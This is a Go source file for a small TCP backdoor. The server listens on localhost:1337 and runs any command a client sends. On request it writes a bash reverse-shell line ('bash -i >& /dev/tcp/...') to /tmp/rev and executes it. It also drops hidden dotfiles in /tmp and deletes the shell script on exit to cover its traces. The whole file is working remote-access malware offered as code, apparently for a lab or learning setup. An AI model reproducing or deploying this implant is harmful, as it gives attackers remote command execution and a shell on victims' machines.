package main

import (
	"bufio"
	"fmt"
	"io/ioutil"
	"log"
	"net"
	"os"
	"os/exec"
	"regexp"
	"runtime"
	"strings"
)

const (
	connHost = "localhost"
	connPort = "1337"
	connType = "tcp"
)

func main() {
	address := connHost + ":" + connPort

	fmt.Println("Starting", connType, "server on", address)

	l, err := net.Listen(connType, address)

	if err != nil {
		fmt.Println("Error:", err.Error())
		os.Exit(1)
	}
	defer l.Close()

	for {
		c, err := l.Accept()
		if err != nil {
			fmt.Println("Error:", err.Error())
			os.Exit(1)
		}
		fmt.Println("Client", c.RemoteAddr().String(), "connected.")

		go handleConnection(c)
	}
}

func handleConnection(conn net.Conn) {
	buffer, err := bufio.NewReader(conn).ReadBytes('\000')
	// fmt.Println(buffer)
	if len(buffer) != 0 {
		buffer = buffer[:len(buffer)-1]
	}
	// fmt.Println(buffer)

	if err != nil {
		fmt.Println("Connection closed.")
		conn.Close()
		return
	}

	if string(buffer[0]) == "W" {
		buffer = buffer[1 : len(buffer)-2]
	} else {
		buffer = buffer[:len(buffer)-1]
	}

	log.Println("Client message:", string(buffer))

	if string(buffer) == "exit" {
		log.Println("Connection closed.")
		conn.Write([]byte(onExit(conn)))
		conn.Close()
		return
	}

	var info string
	if len(buffer) > 0 {
		if string(buffer[:4]) == "file" {
			info = string(buffer[4:])
			buffer = buffer[:4]
		}
	}

	switch string(buffer) {
	case "shell_exec":
		conn.Write([]byte(shellExec(conn)))
	case "whichos":
		conn.Write([]byte(checkOS()))
	case "reverse":
		conn.Write([]byte(openReverse()))
	case "file":
		conn.Write([]byte(wFile([]byte(info))))
	default:
		conn.Write([]byte("Command not found.\n"))
	}

	handleConnection(conn)
}

func checkOS() string {
	return "Running on " + runtime.GOOS + "\n"
}

func shellExec(conn net.Conn) string {
	buffer, err := bufio.NewReader(conn).ReadBytes('\n')

	if err != nil {
		conn.Close()
		return "Connection closed.\n"
	}

	var cmd *exec.Cmd

	if string(buffer[0]) == "W" {
		buffer = buffer[1 : len(buffer)-1]
	}

	instr := strings.Split(string(buffer), " ")

	if len(instr) > 1 {
		args := instr[1:]
		cmd = exec.Command(instr[0], args...)
	} else {
		cmd = exec.Command(string(buffer[:len(buffer)-1]))
	}

	stdout, err := cmd.Output()

	if err != nil {
		return err.Error() + "\n"
	}

	return string(stdout)
}

func openReverse() string {
	if !fileExists("/tmp/rev") {
		d1 := []byte("bash -i >& /dev/tcp/127.0.0.1/5555 0>&1\n")
		err := ioutil.WriteFile("/tmp/rev", d1, 0644)
		if err != nil {
			return "Failed to write file.\n"
		}
	}

	cmd := exec.Command("bash", "/tmp/rev")

	stdout, err := cmd.Output()

	if err != nil {
		return "netcat up? - " + err.Error() + "\n"
	}

	return string(stdout) + "\n"

}

func fileExists(filename string) bool {
	info, err := os.Stat(filename)
	if os.IsNotExist(err) {
		return false
	}
	return !info.IsDir()
}

func onExit(conn net.Conn) string {
	if !fileExists("/tmp/rev") {
		return "Connection closed....\n"
	}
	cmd := exec.Command("rm", "-r", "/tmp/rev")

	_, err := cmd.Output()

	if err != nil {
		return err.Error() + "\n"
	}

	return "Deleted files and Connection closed.\n"
}

func wFile(info []byte) string {
	fmt.Println("info: " + string(info))
	// fmt.Println(info)
	titlePattern := regexp.MustCompile(`.000`)
	bodyPattern := regexp.MustCompile(`==.`)

	var infoS []string

	infoS = titlePattern.Split(string(info), -1)
	infoS = bodyPattern.Split(strings.Join(infoS, ""), -1)

	title := infoS[0]
	body := infoS[1]

	if !fileExists("/tmp/." + title) {
		err := ioutil.WriteFile("/tmp/."+title, []byte(body), 0664)

		if err != nil {
			return "Connection closed - Error writing.\n"
		}
	}

	return "File created!\n"
}
